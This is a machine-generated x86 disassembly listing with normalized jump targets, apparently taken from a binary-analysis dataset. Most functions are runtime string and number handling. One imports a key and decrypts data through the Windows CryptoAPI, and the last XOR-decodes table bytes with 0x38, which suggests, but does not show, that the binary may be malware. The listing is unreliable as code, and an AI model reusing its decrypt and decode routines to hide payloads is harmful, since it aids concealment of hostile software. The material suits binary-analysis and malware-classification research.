mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x6c ] ecx
cmp [ ebp + 0x24 ] ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10024145
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
push ebx
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_1005c23a ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
lea ecx [ eax - 0x31 ]
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_1001897c
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
sub al 0x64
cmp al 0x1
ja r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
pop ebx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
lea ebx [ ecx + eax ]
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
mov edx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
movzx eax [ ebx + 0xa ]
mov esi eax
xor esi [ ebp - 0x32 ]
mov ecx 0x7fff
and edx ecx
and eax ecx
and esi 0x8000
mov edi 0x7fff
lea ecx [ eax + edx ]
mov [ ebp - 0x70 ] esi
movzx ecx cx
cmp dx di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp ax di
jae r-xdata
mov edi 0xbffd
cmp cx di
ja r-xdata
mov esi 0x3fbf
cmp cx si
ja r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp ax si
jne r-xdata
inc ecx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc ecx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
add edi 0x2
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] edx
test edx edx
jle r-xdata
add ecx 0xc002
test cx cx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add ecx 0xffff
test cx cx
jns r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
cmp [ ebp - 0x2c ] ax
ja r-xdata
mov eax ecx
neg eax
movzx esi ax
add ecx esi
test cx cx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov edx esi
add esi esi
or esi eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add ecx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test cx cx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax edx
mov edx [ edi - 0x4 ]
lea esi [ edx + eax ]
cmp esi edx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl edx 0x1f
shr eax 0x1
or eax edx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp cx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or ecx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] cx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov edx 0xffff
cmp [ ebp - 0x22 ] dx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc ecx
jmp r-xdata
sub_1005c26a
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
call sub_10041715
pop ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_10001460
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_1005c290
push ebp
mov ebp esp
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi ] r--data
mov [ esi + 0x14 ] eax
cmp ebx edi
je r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx edi
je r-xdata
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
mov ebx [ lstrlenW@IAT ]
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0xc ] eax
call sub_100796a0
add esp 0xc
xor edi edi
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] edi
cmp [ ebp + 0x10 ] edi
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax edi
je r-xdata
push ebx
mov ebx [ lstrlenW@IAT ]
call ebx
lea edi [ eax + eax ]
lea edx [ edi + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
push edi
push ecx
push eax
mov [ esi + 0x4 ] eax
call sub_100796a0
add esp 0xc
xor edi edi
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] edi
pop edi
mov eax esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x10 ]
cmp eax edi
je r-xdata
mov edx [ ebp + 0xc ]
push edx
call ebx
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp + 0xc ]
push edi
push ecx
push eax
mov [ esi + 0x8 ] eax
call sub_100796a0
add esp 0xc
xor edi edi
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] edi
cmp [ ebp + 0xc ] edi
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
call ebx
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp + 0x10 ]
push edi
push ecx
push eax
mov [ esi + 0x10 ] eax
call sub_100796a0
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x10 ] edi
sub_1005c3b0
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
mov [ ebp - 0x28 ] eax
lea edi [ ebp - 0x24 ]
call sub_1003b7cf
test al al
jne r-xdata
push [ ebp - 0x28 ]
mov ecx esi
xor bl bl
call sub_1003b7cf
test al al
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push [ ebp - 0x28 ]
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_10004056
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10004056
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] 0x2b
jmp r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_10004056
lea eax [ ebp - 0x2c ]
push eax
push 0xa
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x24 ]
xor ebx ebx
push eax
mov [ edi ] 0x0
mov [ ebp - 0x2c ] ebx
call sub_1002c25c
add esp 0x10
push [ ebp - 0x28 ]
mov ecx esi
mov edi eax
call sub_1003b7cf
test al al
je r-xdata
lea edi [ ebp - 0x24 ]
test bl bl
je r-xdata
mov ecx esi
mov bl 0x1
call sub_10066573
push [ ebp - 0x28 ]
mov ecx esi
call sub_1003b7cf
test al al
je r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_10004056
mov ecx esi
lea edi [ ebp - 0x23 ]
call sub_10066573
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x24 ]
cmp [ ebp - 0x30 ] eax
je r-xdata
inc ebx
mov [ edi ] 0x30
inc edi
jmp r-xdata
mov [ ebp - 0x24 ] 0x2d
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_10004056
or ebx 0x2
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp edi [ ebp + 0x14 ]
jl r-xdata
mov al [ esi + 0x5 ]
mov [ edi ] al
lea eax [ ebp - 0x5 ]
cmp edi eax
jae r-xdata
mov ecx esi
call sub_10004056
cmp [ ebp + 0x18 ] edi
jl r-xdata
mov ecx esi
mov bl 0x1
call sub_10066573
inc edi
mov eax [ ebp - 0x34 ]
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
sub_1005c520
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1004bff1
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_1005c541
mov edi edi
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x48 ] 0x0
and [ ebp - 0x4c ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x48 ]
push edx
lea edx [ ebp - 0x4c ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_10043285
add esp 0x18
push eax
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1003650a
fstp [ ebp - 0x44 ]
mov eax [ ebp - 0x4c ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
fld [ ebp - 0x44 ]
shl eax 0x2
push eax
push ecx
fstp [ esp ]
call sub_10021561
pop ecx
fstp [ ebp - 0x44 ]
pop ecx
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x50 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
fld [ ebp - 0x44 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x20
sub_1005c610
push ebp
mov ebp esp
push 0xffffffff
push sub_10082121
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0x4
mov [ edi + 0x10 ] eax
mov ecx 0x7
mov [ edi + 0x14 ] ecx
xor edx edx
mov [ edi ] dx
mov [ edi + 0x30 ] ecx
mov [ edi + 0x2c ] eax
mov [ edi + 0x1c ] dx
mov [ edi + 0x50 ] ecx
mov [ edi + 0x4c ] eax
mov [ edi + 0x3c ] dx
mov [ edi + 0x6c ] ecx
mov [ edi + 0x68 ] eax
mov [ edi + 0x58 ] ax
cmp [ ebp + 0x1c ] 0x10
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] 0x1
jae r-xdata
mov ecx [ ebp + 0x18 ]
push eax
lea esi [ ebp - 0x2c ]
call sub_10039730
add esp 0x4
push eax
lea ecx [ edi + 0x1c ]
mov [ ebp - 0x4 ] 0x5
call sub_10036380
mov ebx 0x8
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] ebx
jb r-xdata
lea eax [ ebp + 0x8 ]
lea edx [ ebp - 0x30 ]
mov [ ebp - 0x30 ] edx
jmp r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1006591f
add esp 0x4
cmp [ ebp + 0x70 ] 0x10
mov eax [ ebp + 0x5c ]
jae r-xdata
push eax
call [ StrToIntA@IAT ]
cmp [ ebp - 0x30 ] 0x0
mov [ edi + 0x38 ] ax
jne r-xdata
lea eax [ ebp + 0x5c ]
cmp [ ebp + 0x38 ] 0x10
mov eax [ ebp + 0x24 ]
jae r-xdata
mov ebx 0x10
mov [ edi + 0x7c ] 0x1
cmp [ ebp + 0x1c ] ebx
jb r-xdata
mov ecx [ ebp + 0x34 ]
push eax
lea esi [ ebp - 0x2c ]
call sub_10039730
add esp 0x4
push eax
lea ecx [ edi + 0x3c ]
mov [ ebp - 0x4 ] 0x6
call sub_10036380
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] ebx
jb r-xdata
lea eax [ ebp + 0x24 ]
mov esi 0xf
mov [ ebp + 0x1c ] esi
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
cmp [ ebp + 0x38 ] ebx
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_1006591f
add esp 0x4
cmp [ ebp + 0x54 ] 0x10
mov eax [ ebp + 0x40 ]
jae r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_1006591f
add esp 0x4
mov [ ebp + 0x38 ] esi
mov [ ebp + 0x34 ] 0x0
mov [ ebp + 0x24 ] 0x0
cmp [ ebp + 0x54 ] ebx
jb r-xdata
mov ecx [ ebp + 0x24 ]
push ecx
call sub_1006591f
add esp 0x4
mov ecx [ ebp + 0x50 ]
push eax
lea esi [ ebp - 0x2c ]
call sub_10039730
add esp 0x4
push eax
lea ecx [ edi + 0x58 ]
mov [ ebp - 0x4 ] 0x7
call sub_10036380
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] ebx
jb r-xdata
lea eax [ ebp + 0x40 ]
mov [ ebp + 0x54 ] esi
mov [ ebp + 0x50 ] 0x0
mov [ ebp + 0x40 ] 0x0
cmp [ ebp + 0x70 ] ebx
jb r-xdata
mov edx [ ebp + 0x40 ]
push edx
call sub_1006591f
add esp 0x4
cmp [ ebp - 0x30 ] 0x0
mov edx [ ebp + 0x78 ]
mov [ edi + 0x78 ] edx
jne r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1006591f
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x5c ]
push eax
call sub_1006591f
add esp 0x4
sub_1005c80e
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
xor edi edi
push edi
xor esi esi
inc esi
push esi
push r--data
push edi
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x4 ]
push eax
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8 ]
call [ CryptImportKey@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push [ eax ]
push edi
push esi
mov esi [ CryptDecrypt@IAT ]
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push 0x2
mov eax esi
lea eax [ ebp - 0x8 ]
push eax
call sub_1000616f
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
pop edi
pop esi
leave
retn 0x10
mov eax esi
cmp eax edi
je r-xdata
push edi
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
mov eax esi
pop ebx
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
push [ ebx ]
push [ ebp + 0x8 ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push ebx
push [ eax ]
push edi
push 0x1
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
pop esi
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
sub_1005c900
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0x8 ] eax
call sub_100796a0
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x8 ] 0x0
sub_1005c940
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x3fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10008757
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_1000bd19
lea eax [ ecx * 4 ]
push eax
call sub_10055606
add esp 0x4
test eax eax
jne r-xdata
sub_1005c9a6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebx + 0x10 ]
mov esi ecx
cmp edi eax
jae r-xdata
sub edi eax
cmp [ ebp + 0x10 ] edi
jae r-xdata
push r--data
call sub_10050437
cmp esi ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push 0x0
push edi
call sub_1002a5ec
test al al
je r-xdata
push 0xffffffff
add edi eax
push edi
call sub_1005721e
push [ ebp + 0xc ]
mov ecx esi
push 0x0
call sub_1005721e
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ ebp + 0xc ]
lea ebx [ edi + edi ]
push ebx
lea eax [ eax + edx * 2 ]
push eax
push ecx
call sub_100796a0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
xor ecx ecx
mov [ ebx + eax ] cx
sub_1005ca43
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_1001215a
pop ecx
test eax eax
je r-xdata
push esi
call sub_1007d8a7
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_10024583
push eax
call sub_10007951
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_1005ca90
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ esi ]
mov eax [ edi * 4 + rw-data ]
mov [ ebp + 0x8 ] eax
mov bl 0x38
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
